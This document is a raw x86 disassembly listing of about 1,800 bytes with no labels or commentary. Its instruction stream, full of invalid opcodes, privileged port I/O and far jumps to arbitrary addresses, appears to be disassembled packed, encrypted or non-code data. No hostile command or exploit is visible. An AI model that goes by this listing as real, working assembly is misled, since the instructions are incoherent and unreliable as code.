  41a604:	fistp  WORD PTR [eax]
  41a606:	rcr    BYTE PTR [esi+0x6f],cl
  41a609:	rcr    DWORD PTR [edi+ebp*4],cl
  41a60c:	mov    eax,ds:0x2b7b4562
  41a611:	ret    
  41a612:	pop    ebx
  41a613:	xchg   DWORD PTR [ebp+0x3487b5e0],esi
  41a619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a61a:	aas    
  41a61b:	jle    0x41a59e
  41a61d:	dec    ebx
  41a61e:	pop    edi
  41a61f:	lahf   
  41a620:	inc    esp
  41a621:	cli    
  41a622:	jge    0x41a5de
  41a624:	sub    ecx,DWORD PTR [esi+0x7326f2d6]
  41a62a:	ja     0x41a630
  41a62c:	pushf  
  41a62d:	mov    fs,WORD PTR cs:[edx]
  41a630:	sub    bl,BYTE PTR [ebx]
  41a632:	int    0x30
  41a634:	xor    al,0x64
  41a636:	sub    BYTE PTR [ebp+esi*1-0x56367ee8],bh
  41a63d:	mov    WORD PTR [edi-0x1],?
  41a640:	(bad)  
  41a641:	pop    ds
  41a642:	inc    esp
  41a643:	iret   
  41a644:	std    
  41a645:	das    
  41a646:	aas    
  41a647:	icebp  
  41a648:	iret   
  41a649:	mov    gs,WORD PTR [ebp-0x5a04a0c3]
  41a64f:	pop    edi
  41a650:	mov    bh,BYTE PTR [edi+0x7b]
  41a653:	outs   dx,BYTE PTR ds:[esi]
  41a654:	outs   dx,BYTE PTR ds:[esi]
  41a655:	mov    edi,0xc0803b7b
  41a65a:	sbb    ebx,DWORD PTR [esi]
  41a65c:	add    bl,BYTE PTR [ebx+ebx*1-0x9]
  41a660:	ret    
  41a661:	ja     0x41a6b0
  41a663:	sti    
  41a664:	(bad)  
  41a666:	in     eax,dx
  41a667:	jg     0x41a632
  41a669:	jmp    0x41a5fa
  41a66b:	push   ds
  41a66c:	cmp    eax,0x536492aa
  41a671:	into   
  41a672:	jmp    0xa9ea:0x83d15830
  41a679:	jae    0x41a678
  41a67b:	jmp    0xfa156497
  41a680:	out    dx,eax
  41a681:	lock (bad) 
  41a683:	out    0xe2,eax
  41a685:	mov    dl,BYTE PTR [ecx]
  41a687:	addr16 cmp eax,0xd8ebeb5b
  41a68d:	icebp  
  41a68e:	jne    0x41a626
  41a690:	out    dx,al
  41a691:	cld    
  41a692:	mov    edi,0x5e407e70
  41a697:	or     al,0x48
  41a699:	mov    WORD PTR [esi-0x210fb2a6],fs
  41a69f:	xor    ebp,DWORD PTR [edx+esi*2]
  41a6a2:	mov    esp,0x4846502b
  41a6a7:	stos   BYTE PTR es:[edi],al
  41a6a8:	mov    ch,BYTE PTR [edx+0x54]
  41a6ab:	and    DWORD PTR [ecx+eax*1+0x29],edx
  41a6af:	mov    ?,WORD PTR [esi+0x6088921b]
  41a6b5:	xchg   esp,eax
  41a6b6:	sub    al,bh
  41a6b8:	data16 sti 
  41a6ba:	sbb    al,0x24
  41a6bc:	inc    eax
  41a6bd:	sbb    DWORD PTR [edi-0x58],eax
  41a6c0:	add    eax,0x2af24aed
  41a6c5:	jae    0x41a665
  41a6c7:	sbb    eax,0xb8b224c1
  41a6cc:	lahf   
  41a6cd:	mov    eax,ebp
  41a6cf:	jle    0x41a663
  41a6d1:	(bad)  
  41a6d3:	test   BYTE PTR [ecx-0x80],cl
  41a6d6:	or     eax,0x15823c02
  41a6db:	inc    eax
  41a6dc:	or     DWORD PTR [edx+0x9],ecx
  41a6df:	push   0x18d10e55
  41a6e4:	add    DWORD PTR [ecx+0x2b5542d2],eax
  41a6ea:	ss push esi
  41a6ec:	(bad)  [ebx+ebx*2+0x47a8105d]
  41a6f3:	jg     0x41a6c1
  41a6f5:	fs mov dl,0xc9
  41a6f8:	test   BYTE PTR [esi-0x2972e698],dh
  41a6fe:	(bad)  
  41a6ff:	shl    DWORD PTR [eax],1
  41a701:	mov    bh,0x33
  41a703:	sbb    al,0xe4
  41a705:	fs mov esi,0x115f6ac1
  41a70b:	lea    eax,[edi]
  41a70d:	dec    eax
  41a70e:	mov    ecx,0xfbca270a
  41a713:	mov    dl,0x82
  41a715:	push   cs
  41a716:	dec    edi
  41a717:	and    eax,0x934a2a10
  41a71c:	mov    ?,WORD PTR [edx-0x18]
  41a71f:	mov    ds:0x6ae741b6,al
  41a724:	ror    DWORD PTR [ebp+0x1caa5042],cl
  41a72a:	ds in  al,0x5
  41a72d:	push   0xffffffd5
  41a72f:	nop
  41a730:	out    dx,al
  41a731:	dec    dx
  41a733:	pop    ebx
  41a734:	or     eax,0x49b2e829
  41a739:	dec    esi
  41a73a:	iret   
  41a73b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a73c:	je     0x41a7aa
  41a73e:	xchg   edi,eax
  41a73f:	mov    gs,WORD PTR [ebx+0x13]
  41a742:	jmp    0x93ea7ff9
  41a747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a748:	pop    esp
  41a749:	call   0x2173fd76
  41a74e:	lods   al,BYTE PTR ds:[esi]
  41a74f:	lds    edx,FWORD PTR [edi+edx*8]
  41a752:	pop    esp
  41a753:	cwde   
  41a754:	jb     0x41a72a
  41a756:	clc    
  41a757:	jbe    0x41a770
  41a759:	out    dx,eax
  41a75a:	mov    dh,0xdb
  41a75c:	ds stos BYTE PTR es:[edi],al
  41a75e:	daa    
  41a75f:	lock pop esp
  41a761:	jmp    0xe4d6078f
  41a766:	xchg   ebx,eax
  41a767:	push   ecx
  41a768:	jmp    0x41a759
  41a76a:	xchg   ebp,eax
  41a76b:	dec    edx
  41a76c:	aas    
  41a76d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a76e:	je     0x41a78e
  41a770:	inc    esi
  41a771:	(bad)  
  41a772:	retf   
  41a773:	adc    ah,ah
  41a775:	in     eax,dx
  41a776:	jbe    0x41a759
  41a778:	adc    dh,BYTE PTR [eax+ebx*8-0x49a0eafa]
  41a77f:	and    al,0xc7
  41a781:	mov    eax,ds:0xc3ad6b66
  41a786:	hlt    
  41a787:	popf   
  41a788:	mov    edi,DWORD PTR [ebx+ebp*2+0x71bf49a2]
  41a78f:	cdq    
  41a790:	(bad)  
  41a792:	pushf  
  41a793:	(bad)  
  41a794:	add    BYTE PTR [esi-0x322da4d1],dl
  41a79a:	xchg   esp,eax
  41a79b:	and    al,0x32
  41a79d:	inc    esp
  41a79e:	cdq    
  41a79f:	and    eax,0x9db49670
  41a7a4:	adc    ah,cl
  41a7a6:	jmp    0xff731657
  41a7ab:	push   0x243ae185
  41a7b0:	push   ecx
  41a7b1:	enter  0x4ae6,0x8b
  41a7b5:	fld    QWORD PTR [edi]
  41a7b7:	add    esi,esi
  41a7b9:	jmp    esp
  41a7bb:	xor    edi,eax
  41a7bd:	lock sbb DWORD PTR [esp+ecx*1-0x3fb5a0b9],ebp
  41a7c5:	xchg   edi,eax
  41a7c6:	push   ds
  41a7c7:	test   ecx,esi
  41a7c9:	push   eax
  41a7ca:	or     DWORD PTR [ebx+eiz*8],ecx
  41a7cd:	xchg   ecx,eax
  41a7ce:	mov    ds:0xb2d3c0fe,al
  41a7d3:	cld    
  41a7d4:	aam    0xfe
  41a7d6:	(bad)  
  41a7d7:	pop    ebp
  41a7d8:	pop    esi
  41a7d9:	fisubr WORD PTR [eax-0x367c2703]
  41a7df:	push   edi
  41a7e0:	jle    0x41a7cc
  41a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7e3:	div    al
  41a7e5:	mov    ecx,0x53b5bdcf
  41a7ea:	test   BYTE PTR [edi+0x38],ch
  41a7ed:	add    BYTE PTR [ebx+ebp*4-0x4],bl
  41a7f1:	aaa    
  41a7f2:	and    edi,edx
  41a7f4:	add    eax,eax
  41a7f6:	dec    ebx
  41a7f7:	push   ds
  41a7f8:	xchg   edi,eax
  41a7f9:	retf   0xc89f
  41a7fc:	or     esi,esp
  41a7fe:	dec    esp
  41a7ff:	scas   eax,DWORD PTR es:[edi]
  41a800:	cdq    
  41a801:	push   esp
  41a802:	dec    esi
  41a803:	pop    ds
  41a804:	pop    edi
  41a805:	fnstcw WORD PTR [ecx-0x2]
  41a808:	in     al,0xe0
  41a80a:	mov    edi,0xa0fff02d
  41a80f:	xchg   edx,eax
  41a810:	xchg   esp,eax
  41a811:	arpl   WORD PTR [edi-0x714d4a5],bp
  41a817:	push   0xffffff87
  41a819:	lds    esi,FWORD PTR [edi-0x3]
  41a81c:	push   cs
  41a81d:	cwde   
  41a81e:	add    DWORD PTR [ecx-0x65f9ee13],ebp
  41a824:	icebp  
  41a825:	and    al,0x46
  41a827:	mov    eax,ss
  41a829:	int    0x7
  41a82b:	adc    al,0xae
  41a82d:	and    BYTE PTR [eax],cl
  41a82f:	adc    al,0x62
  41a831:	retf   0xf435
  41a834:	or     bl,BYTE PTR [esi+eax*8]
  41a837:	push   0xbc2397c4
  41a83c:	jge    0x41a7df
  41a83e:	mov    BYTE PTR [esp+ecx*4+0x13],bh
  41a842:	xor    DWORD PTR [ebx+0x5427b5a0],0x6
  41a849:	pop    ebx
  41a84b:	cmp    BYTE PTR [ebx+0x16dc9af5],al
  41a851:	lods   al,BYTE PTR ds:[esi]
  41a852:	or     al,0x57
  41a854:	mov    ecx,0x9e11f2bf
  41a859:	fild   QWORD PTR [eax-0x7355fd0]
  41a85f:	fs (bad) 
  41a861:	ror    BYTE PTR [eax],0x43
  41a864:	retf   0xdb91
  41a867:	mov    ds:0xf6d8004b,al
  41a86c:	add    dh,BYTE PTR [edx+ebp*1-0x345c97a3]
  41a873:	ins    BYTE PTR es:[edi],dx
  41a874:	ret    
  41a875:	out    0xe6,al
  41a877:	or     BYTE PTR [edi-0x33],0x6d
  41a87b:	nop
  41a87c:	jmp    0x399b:0x5abecd7f
  41a883:	rol    ebx,cl
  41a885:	mov    BYTE PTR [edi],ch
  41a887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a888:	add    ebp,DWORD PTR [ebx]
  41a88a:	or     eax,0x36e0cd02
  41a88f:	ret    0x242c
  41a892:	mov    al,0x35
  41a894:	mov    ?,WORD PTR [ecx+0x4d75630a]
  41a89a:	arpl   WORD PTR [di],bx
  41a89d:	shr    ecx,cl
  41a89f:	shl    BYTE PTR [eax-0x4c1425b9],0xb1
  41a8a6:	xchg   ecx,eax
  41a8a7:	shr    BYTE PTR [ecx+0xf],cl
  41a8aa:	sbb    BYTE PTR [ebx-0x3d716e58],bl
  41a8b0:	lea    ebp,[ebp+0x2]
  41a8b3:	dec    ebp
  41a8b4:	or     ebp,esp
  41a8b6:	push   edx
  41a8b7:	mov    al,ds:0x47c8b572
  41a8bc:	sub    DWORD PTR [eax+0x5a9413ce],esi
  41a8c2:	lds    ebp,FWORD PTR [edx+0x4b]
  41a8c5:	cmp    BYTE PTR [ebx+0x65dcf09a],bh
  41a8cb:	ret    
  41a8cc:	jecxz  0x41a865
  41a8ce:	add    bl,BYTE PTR [esi]
  41a8d0:	popf   
  41a8d1:	(bad)  
  41a8d4:	adc    eax,0x60dcdb33
  41a8d9:	int    0x2e
  41a8db:	icebp  
  41a8dc:	daa    
  41a8dd:	arpl   WORD PTR [bp-0x49],cx
  41a8e1:	add    al,0x17
  41a8e3:	sbb    BYTE PTR [edx+0x3d614c7a],ah
  41a8e9:	dec    edx
  41a8ea:	xor    DWORD PTR [edx],edi
  41a8ec:	fidiv  WORD PTR [esi-0x34]
  41a8ef:	pop    edi
  41a8f0:	xchg   BYTE PTR [ebx],ah
  41a8f2:	push   edi
  41a8f3:	cs pushf 
  41a8f5:	das    
  41a8f6:	adc    eax,0x61008f5f
  41a8fb:	xor    al,0x45
  41a8fd:	ins    BYTE PTR es:[edi],dx
  41a8fe:	hlt    
  41a8ff:	ficom  DWORD PTR [ecx]
  41a901:	addr16 mov al,ds:0xeb4a
  41a905:	jle    0x41a8bc
  41a907:	fidiv  DWORD PTR [edi-0x2b811b44]
  41a90d:	add    BYTE PTR [ebp+ebx*2-0x351e1ff9],dh
  41a914:	int3   
  41a915:	add    ch,bh
  41a917:	cmp    eax,0x5ad9a849
  41a91c:	ins    DWORD PTR es:[edi],dx
  41a91d:	jae    0x41a90d
  41a91f:	fnstcw WORD PTR [edx]
  41a921:	imul   esi,DWORD PTR [ebp+0xb34760d],0xffffffaa
  41a928:	push   ecx
  41a929:	xchg   ebx,eax
  41a92a:	pop    ebp
  41a92b:	mov    cl,0xa1
  41a92d:	sbb    dh,dh
  41a92f:	mov    ecx,0x5bd3d270
  41a934:	ins    DWORD PTR es:[edi],dx
  41a935:	rcr    edi,cl
  41a937:	in     al,dx
  41a938:	push   ecx
  41a939:	stos   DWORD PTR es:[edi],eax
  41a93a:	inc    esp
  41a93b:	mov    ds:0x5ea114f5,eax
  41a940:	dec    edi
  41a941:	test   al,0x37
  41a943:	stos   DWORD PTR es:[edi],eax
  41a944:	aam    0xc7
  41a946:	stos   BYTE PTR es:[edi],al
  41a947:	lods   al,BYTE PTR ds:[esi]
  41a948:	pop    esi
  41a949:	fsubrp st(0),st
  41a94b:	enter  0x1503,0xf2
  41a94f:	lahf   
  41a950:	clc    
  41a951:	add    edx,edx
  41a953:	call   0x8c74075c
  41a958:	clc    
  41a959:	shr    DWORD PTR [eax+0x287bf2b2],1
  41a95f:	pop    edi
  41a960:	push   ss
  41a961:	inc    ebx
  41a962:	inc    ebp
  41a963:	sub    al,dl
  41a965:	sub    BYTE PTR [ebp+0x20],al
  41a968:	sahf   
  41a969:	fiadd  DWORD PTR [edi+0x13b5919e]
  41a96f:	mov    ebx,0x797cb81f
  41a974:	jae    0x41a972
  41a976:	and    ebx,DWORD PTR [edi]
  41a978:	scas   eax,DWORD PTR es:[edi]
  41a979:	cld    
  41a97a:	(bad)
  41a97d:	lds    eax,FWORD PTR [ecx-0x20]
  41a980:	or     eax,0xeb6d8005
  41a985:	mov    edi,0x42bdfa4d
  41a98a:	int    0xff
  41a98c:	mov    dh,0xb2
  41a98e:	mov    edi,0x6cbf6f52
  41a993:	outs   dx,BYTE PTR ds:[esi]
  41a994:	outs   dx,BYTE PTR ds:[esi]
  41a995:	stos   BYTE PTR es:[edi],al
  41a996:	add    eax,0xa27cccc6
  41a99b:	sub    dl,BYTE PTR [edi]
  41a99d:	dec    edi
  41a99e:	mov    bh,0x76
  41a9a0:	popf   
  41a9a1:	cmp    eax,0xaf4dfed1
  41a9a6:	in     al,0xa7
  41a9a8:	imul   edx,DWORD PTR [ebp-0x392a138e],0xffffffea
  41a9af:	sbb    ch,BYTE PTR [esi]
  41a9b1:	out    dx,al
  41a9b2:	jo     0x41a99d
  41a9b4:	sar    BYTE PTR [edi-0x4169bb3c],0xed
  41a9bb:	mov    eax,ds:0x212bd435
  41a9c0:	cmc    
  41a9c1:	sub    BYTE PTR [ecx-0x18],ah
  41a9c4:	jb     0x41a9c0
  41a9c6:	pop    ecx
  41a9c7:	pop    ds
  41a9c8:	scas   eax,DWORD PTR es:[edi]
  41a9c9:	or     eax,DWORD PTR [edx]
  41a9cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9cc:	retf   0x32c5
  41a9cf:	mov    ebp,0xcc96f323
  41a9d4:	jp     0x41aa08
  41a9d6:	fwait
  41a9d7:	inc    ecx
  41a9d8:	add    esi,ebx
  41a9da:	or     ch,BYTE PTR [ecx+0x438514b3]
  41a9e0:	pushf  
  41a9e1:	loopne 0x41aa50
  41a9e3:	sub    DWORD PTR [edi],0xae77e54a
  41a9e9:	dec    esp
  41a9ea:	lea    ebx,[ecx+0x2b]
  41a9ed:	or     al,0xf2
  41a9ef:	add    DWORD PTR [ecx],esp
  41a9f1:	sbb    DWORD PTR [ebx-0x35639213],edi
  41a9f7:	call   0x4246:0x8d293a74
  41a9fe:	sub    eax,0x7d94a4d2
  41aa03:	repz pop esi
  41aa05:	dec    edx
  41aa06:	mov    ebp,DWORD PTR [edi+0x5ac6b1ae]
  41aa0c:	test   BYTE PTR [eax-0x60],cl
  41aa0f:	fucomp st(2)
  41aa11:	lock out dx,al
  41aa13:	mov    DWORD PTR ds:0x11a58d26,eax
  41aa19:	int3   
  41aa1a:	arpl   WORD PTR [esp+ebx*1-0x6715e225],sp
  41aa21:	dec    eax
  41aa22:	inc    edx
  41aa23:	bound  edx,QWORD PTR ds:0x226224a3
  41aa29:	fcmove st,st(7)
  41aa2b:	or     ebx,ebp
  41aa2d:	nop
  41aa2e:	test   esp,ecx
  41aa30:	nop
  41aa31:	ja     0x41aa0a
  41aa33:	dec    eax
  41aa34:	aam    0x26
  41aa36:	xchg   edi,eax
  41aa38:	das    
  41aa39:	repz leave 
  41aa3b:	sub    DWORD PTR [eax+0x70f8e6a7],edi
  41aa41:	xor    esp,esi
  41aa43:	pop    ebx
  41aa44:	fwait
  41aa45:	xor    BYTE PTR [esi],bh
  41aa47:	push   ebp
  41aa48:	add    edx,DWORD PTR [ecx]
  41aa4a:	repnz in eax,dx
  41aa4c:	inc    eax
  41aa4d:	arpl   WORD PTR [ebp+ebp*2-0x35],sp
  41aa51:	stc    
  41aa52:	jmp    ebp
  41aa54:	arpl   WORD PTR [ebp+0x33daa95c],ax
  41aa5a:	(bad)  
  41aa5b:	adc    DWORD PTR [edi],esp
  41aa5d:	and    DWORD PTR [ebp+0x64c68566],esi
  41aa63:	(bad)  
  41aa64:	(bad)  
  41aa65:	push   esp
  41aa66:	xor    DWORD PTR [ecx+0x35513ae9],0x64
  41aa6d:	jge    0x41aad8
  41aa6f:	rcl    cl,0xf9
  41aa72:	cwde   
  41aa73:	daa    
  41aa74:	out    0x1b,al
  41aa76:	sub    al,0xf7
  41aa78:	test   dl,cl
  41aa7a:	js     0x41aa19
  41aa7c:	fidivr DWORD PTR [eax+0x15]
  41aa7f:	ror    DWORD PTR [edx-0x225a9264],1
  41aa85:	es std 
  41aa87:	inc    esi
  41aa88:	out    dx,al
  41aa89:	aas    
  41aa8a:	mov    ds:0xd9002246,eax
  41aa8f:	push   esi
  41aa90:	pusha  
  41aa91:	mov    ecx,0x5c95717a
  41aa96:	jns    0x41aa35
  41aa98:	enter  0x3076,0x34
  41aa9c:	cli    
  41aa9d:	mov    edi,0xcd78815d
  41aaa2:	psraw  mm5,QWORD PTR [edx+0x69ab9009]
  41aaa9:	rcr    esp,0x11
  41aaac:	sub    DWORD PTR [eax+0x34],ebp
  41aaaf:	stos   BYTE PTR es:[edi],al
  41aab0:	or     al,0xd6
  41aab2:	jnp    0x41aa60
  41aab4:	ds stos DWORD PTR es:[edi],eax
  41aab6:	cmp    cl,dh
  41aab8:	pop    eax
  41aab9:	dec    esp
  41aaba:	jb     0x41aa8b
  41aabc:	xor    ah,bl
  41aabe:	adc    esi,DWORD PTR [ecx]
  41aac0:	dec    edx
  41aac1:	(bad)  
  41aac2:	mov    ecx,0xe76280eb
  41aac7:	jle    0x41aaaa
  41aac9:	hlt    
  41aaca:	mov    cl,0x21
  41aacc:	jns    0x41ab1f
  41aace:	nop
  41aacf:	push   esp
  41aad0:	and    dh,BYTE PTR [edx-0x1ae86d2c]
  41aad6:	pop    edx
  41aad7:	xchg   DWORD PTR [ecx+0x25],ecx
  41aada:	mov    al,ds:0x23f36add
  41aadf:	mov    edi,0xf16cf056
  41aae4:	xchg   edi,eax
  41aae5:	test   al,0x72
  41aae7:	lea    esi,[edx]
  41aae9:	xchg   esp,eax
  41aaea:	sub    bl,BYTE PTR [ebx-0x5f]
  41aaed:	popf   
  41aaee:	jae    0x41aa90
  41aaf0:	sbb    BYTE PTR [ebp+0x29446b79],dl
  41aaf6:	lods   al,BYTE PTR ds:[esi]
  41aaf7:	sub    eax,ecx
  41aaf9:	mov    al,ds:0x7bd42816
  41aafe:	lahf   
  41aaff:	xchg   ecx,eax
  41ab00:	int    0x17
  41ab02:	data16 aas 
  41ab04:	mov    al,0x71
  41ab06:	popa   
  41ab07:	imul   esi,edx,0x23
  41ab0a:	lahf   
  41ab0b:	test   al,0x7e
  41ab0d:	jmp    0x2fac2af9
  41ab12:	outs   dx,DWORD PTR ds:[esi]
  41ab13:	xchg   BYTE PTR [esi+0x6f2357da],ch
  41ab19:	sub    BYTE PTR [eax],al
  41ab1b:	pop    esp
  41ab1c:	retf   
  41ab1d:	cli    
  41ab1e:	jg     0x41aab7
  41ab20:	notrack call DWORD PTR [edi-0x2128034d]
  41ab27:	retf   0x5717
  41ab2a:	repz pusha 
  41ab2c:	int    0x44
  41ab2e:	aad    0x8b
  41ab30:	xchg   edi,eax
  41ab31:	pop    edx
  41ab32:	jae    0x41aadb
  41ab34:	lahf   
  41ab35:	fdivp  st(4),st
  41ab37:	dec    ebp
  41ab38:	adc    edi,edi
  41ab3a:	rcl    ebp,cl
  41ab3c:	inc    esi
  41ab3d:	mov    BYTE PTR [edi+0x75c5d59e],dh
  41ab43:	dec    esp
  41ab44:	xor    al,0xe0
  41ab46:	in     al,0xbe
  41ab48:	jg     0x41ab98
  41ab4a:	push   eax
  41ab4b:	sub    eax,0xa29f5d48
  41ab50:	sbb    BYTE PTR [edx-0x75],dl
  41ab53:	and    bl,BYTE PTR [edx+0x29461ab5]
  41ab59:	mov    dh,0xd2
  41ab5b:	push   cs
  41ab5c:	into   
  41ab5d:	pop    ss
  41ab5e:	push   0x30ef382d
  41ab63:	push   0x20200242
  41ab68:	das    
  41ab69:	xchg   ah,ah
  41ab6b:	imul   eax,DWORD PTR [ecx+0x6a],0x61dc8a0b
  41ab72:	xor    eax,DWORD PTR [edi]
  41ab74:	cs (bad) 
  41ab76:	mov    edx,0x451d6702
  41ab7b:	pop    esi
  41ab7c:	test   DWORD PTR cs:[ebp-0x4e14f5e9],eax
  41ab83:	add    eax,0xe2b34e04
  41ab88:	pop    ss
  41ab89:	mov    ecx,0x4387bab7
  41ab8e:	scas   al,BYTE PTR es:[edi]
  41ab8f:	retf   
  41ab90:	mov    esi,DWORD PTR [esi-0x6e]
  41ab93:	cmc    
  41ab94:	lods   eax,DWORD PTR ds:[esi]
  41ab95:	xchg   esp,eax
  41ab96:	leave  
  41ab97:	leave  
  41ab98:	sbb    cl,BYTE PTR [ecx+0x58a31451]
  41ab9e:	push   ebp
  41ab9f:	jmp    0x5a9e4e75
  41aba4:	xchg   ebp,eax
  41aba5:	jl     0x41ab27
  41aba7:	push   esi
  41aba8:	push   esp
  41aba9:	icebp  
  41abaa:	hlt    
  41abab:	fiadd  DWORD PTR [ebx]
  41abad:	ficomp WORD PTR [ebx]
  41abaf:	div    BYTE PTR [eax+0x66]
  41abb2:	add    esp,DWORD PTR [edi+0x56]
  41abb5:	test   eax,0x222a3029
  41abba:	xchg   esp,eax
  41abbb:	sub    dl,BYTE PTR [ecx+0x5740909]
  41abc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abc2:	sar    BYTE PTR [edx],0xcd
  41abc5:	mov    eax,ds:0x24f70cea
  41abca:	sub    esi,edx
  41abcc:	int3   
  41abcd:	mov    bl,0xb7
  41abcf:	icebp  
  41abd0:	and    al,0x33
  41abd2:	rol    DWORD PTR [edx],1
  41abd4:	adc    eax,DWORD PTR [esi-0x4d]
  41abd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abd8:	fisub  DWORD PTR [ecx+eiz*2-0x6a94a0f4]
  41abdf:	repz inc bh
  41abe2:	sub    dl,BYTE PTR [ecx]
  41abe4:	jge    0x41abea
  41abe6:	gs dec edx
  41abe8:	jbe    0x41abc7
  41abea:	mov    esi,cs
  41abec:	out    0x95,al
  41abee:	rcr    DWORD PTR [esp+edx*4+0x37],1
  41abf2:	retf   0xe643
  41abf5:	inc    ecx
  41abf6:	pop    ecx
  41abf7:	mov    DWORD PTR [eax-0x2f20c98e],0x8d7c1395
  41ac01:	adc    ch,BYTE PTR [edx+0x13]
  41ac04:	push   ebp
  41ac05:	jmp    0x6a55:0xe31a55e3
  41ac0c:	int    0x1a
  41ac0e:	jno    0x41abb0
  41ac10:	enter  0xa2b4,0x60
  41ac14:	aam    0xad
  41ac16:	aaa    
  41ac17:	mov    dl,0xe6
  41ac19:	mov    dl,BYTE PTR [ecx]
  41ac1b:	mov    ecx,0xf1785237
  41ac20:	push   edi
  41ac21:	retf   
  41ac22:	jns    0x41abf9
  41ac24:	test   al,0xbc
  41ac26:	clc    
  41ac27:	dec    edx
  41ac28:	(bad)  
  41ac2a:	mov    BYTE PTR [edi+0x7e0eded8],dh
  41ac30:	je     0x41abf1
  41ac32:	fadd   QWORD PTR [ecx+0x5d]
  41ac35:	jae    0x41ac2c
  41ac37:	mov    bh,0x39
  41ac39:	add    ecx,esi
  41ac3b:	inc    eax
  41ac3c:	out    dx,al
  41ac3d:	lock mov ecx,0xdf16a7c5
  41ac43:	int    0x48
  41ac45:	aaa    
  41ac46:	push   ebx
  41ac47:	je     0x41ac37
  41ac49:	test   al,0x27
  41ac4b:	xor    DWORD PTR [ebp+0x7af68546],ecx
  41ac51:	xchg   DWORD PTR [ebx-0x21],esi
  41ac54:	mov    WORD PTR [ecx+0x4d],ds
  41ac57:	push   edx
  41ac58:	fdiv   st(6),st
  41ac5a:	outs   dx,DWORD PTR ds:[esi]
  41ac5b:	xchg   ebx,eax
  41ac5c:	dec    ebp
  41ac5d:	sub    al,0x50
  41ac5f:	setp   ah
  41ac62:	stos   DWORD PTR es:[edi],eax
  41ac63:	adc    eax,0xe3ea5f2e
  41ac68:	xor    al,cl
  41ac6a:	fimul  DWORD PTR [edx+ecx*2+0xc4e2235]
  41ac71:	js     0x41acc2
  41ac73:	jnp    0x41ac18
  41ac75:	ret    
  41ac76:	pop    es
  41ac77:	aas    
  41ac78:	in     eax,dx
  41ac79:	js     0x41ac9c
  41ac7b:	jnp    0x41abff
  41ac7d:	test   BYTE PTR [edx],dh
  41ac7f:	or     eax,0xc630e01c
  41ac84:	mov    ds:0x9e221c4,eax
  41ac89:	xchg   esp,eax
  41ac8a:	daa    
  41ac8b:	xchg   ecx,eax
  41ac8c:	adc    dl,0x2b
  41ac8f:	xor    DWORD PTR [edx+edi*1],esp
  41ac92:	sub    DWORD PTR [edi+0x3f],esp
  41ac95:	sub    BYTE PTR [edi],al
  41ac97:	neg    DWORD PTR [esi+0x7be3cd90]
  41ac9d:	fidivr WORD PTR [edi-0x32a4687]
  41aca3:	mov    cl,0x1f
  41aca5:	jl     0x41aca6
  41aca7:	xchg   edi,eax
  41aca8:	aas    
  41aca9:	(bad)  
  41acaa:	icebp  
  41acab:	jnp    0x41ac8c
  41acad:	xchg   edx,eax
  41acae:	jl     0x41ac70
  41acb0:	sbb    eax,DWORD PTR [edx]
  41acb2:	add    bl,bl
  41acb4:	xchg   esi,eax
  41acb5:	jg     0x41ad12
  41acb7:	outs   dx,BYTE PTR ds:[esi]
  41acb8:	mov    ds:0x8a25efdb,al
  41acbd:	into   
  41acbe:	or     eax,0x5d3f813c
  41acc3:	daa    
  41acc4:	pop    eax
  41acc5:	sub    ebx,DWORD PTR [ebp+esi*4-0x4b]
  41acc9:	mov    dh,0x31
  41accb:	cmc    
  41accc:	cld    
  41accd:	jecxz  0x41acbc
  41accf:	fild   WORD PTR [ecx+edi*8+0x7f]
  41acd3:	push   0x9e728362
  41acd8:	mov    ch,0xe5
  41acda:	or     eax,0xd8e03c74
  41acdf:	in     al,dx
  41ace0:	aas    
  41ace1:	inc    ebp
  41ace2:	test   DWORD PTR [esi],ecx
  41ace4:	sbb    esi,esp
  41ace6:	sub    esp,edi
  41ace8:	add    BYTE PTR [ecx],dl
  41acea:	test   al,0x44
  41acec:	adc    DWORD PTR [ecx+0x12],ecx
  41acef:	xor    dh,BYTE PTR [ebx+eax*2+0x32]
  41acf3:	lahf   
  41acf4:	adc    ebx,DWORD PTR [eax-0x773a3e4e]
  41acfa:	inc    esi
  41acfb:	(bad)  [edx-0x46]
  41acfe:	outs   dx,BYTE PTR ds:[esi]
  41acff:	and    BYTE PTR [edx],al
  41ad01:	test   DWORD PTR [ecx+0x79],eax
  41ad04:	lea    ebx,[ebx]
  41ad06:	pop    edx
  41ad07:	pop    esp
  41ad08:	scas   eax,DWORD PTR es:[edi]
  41ad09:	pop    esp
  41ad0a:	xchg   ebp,eax
  41ad0b:	push   edi
  41ad0c:	lods   al,BYTE PTR ds:[esi]
  41ad0d:	and    dh,BYTE PTR [edi-0x5a6f4b8a]
  41ad13:	ret    0x8e16
  41ad16:	lods   al,BYTE PTR ds:[esi]
  41ad17:	add    ch,ah
  41ad19:	add    cl,BYTE PTR [edx+ecx*4]
  41ad1c:	or     BYTE PTR [ebp-0x5c],al
  41ad1f:	xor    eax,0x3b92726b
  41ad24:	sub    esi,DWORD PTR [edi+0x72]
  41ad27:	inc    esp
  41ad28:	mov    dh,0x78
  41ad2a:	mov    edx,0x9fb749d8
  41ad2f:	push   ecx
  41ad30:	dec    ecx
  41ad31:	or     al,0xcd
  41ad33:	cmp    BYTE PTR [eax],al
  41ad35:	push   ebp
  41ad36:	dec    esi
  41ad37:	jmp    0x41ad4e
  41ad39:	mov    bl,0x3d
  41ad3b:	jbe    0x41ad88
  41ad3d:	push   ecx
  41ad3e:	push   ecx
  41ad3f:	mov    al,BYTE PTR [eax-0x60]
  41ad42:	fisttp QWORD PTR [esi-0x7]
  41ad45:	in     al,0x58
  41ad47:	(bad)  
  41ad48:	xchg   esi,eax
  41ad49:	jge    0x41ace5
  41ad4b:	mov    cl,0x38
  41ad4d:	addr16 sub al,0xc
  41ad50:	mov    DWORD PTR [ebp+eax*4+0x46],esi
  41ad54:	aam    0xa0
  41ad56:	sbb    al,BYTE PTR [esi+0x684ea624]
  41ad5c:	adc    cl,BYTE PTR [edx]
  41ad5e:	mov    ch,0xc5
  41ad60:	xchg   edx,eax
  41ad61:	cmp    ecx,esi
  41ad63:	push   edx
